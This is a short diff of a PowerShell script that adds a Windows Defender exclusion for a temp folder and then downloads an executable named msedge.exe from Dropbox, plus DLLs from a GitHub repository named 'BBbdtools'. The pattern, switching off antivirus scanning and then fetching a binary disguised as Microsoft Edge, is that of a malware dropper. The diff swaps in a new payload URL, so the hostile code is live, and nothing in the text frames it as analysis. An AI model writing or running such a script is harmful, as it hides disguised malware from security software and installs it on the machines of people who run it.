@@ -6,7 +6,7 @@ Add-MpPreference -ExclusionPath '$env:temp/sVBXKuz'
 
 cd sVBXKuz
 
-Invoke-WebRequest -Uri "dl.dropboxusercontent.com/scl/fi/xj2dqhq094ir9olj72010/msedge.exe?rlkey=9rrl7aydy1zgah7ityz8c0dbz&st=af7snzs2&dl=0" -OutFile msedge.exe
+Invoke-WebRequest -Uri "dl.dropboxusercontent.com/s/v2ra4pz4u1lkyfiqx9s82/msedge.exe?rlkey=6g0nqgfte2elwh264vurq0gij&st=5dydavqm&dl=0" -OutFile msedge.exe
 Invoke-WebRequest -Uri "https://raw.githubusercontent.com/blousekool/BBbdtools/main/bd/tools/libsodium.dll" -OutFile libsodium.dll
 Invoke-WebRequest -Uri "https://raw.githubusercontent.com/blousekool/BBbdtools/main/bd/tools/libopus.dll" -OutFile libopus.dll
 
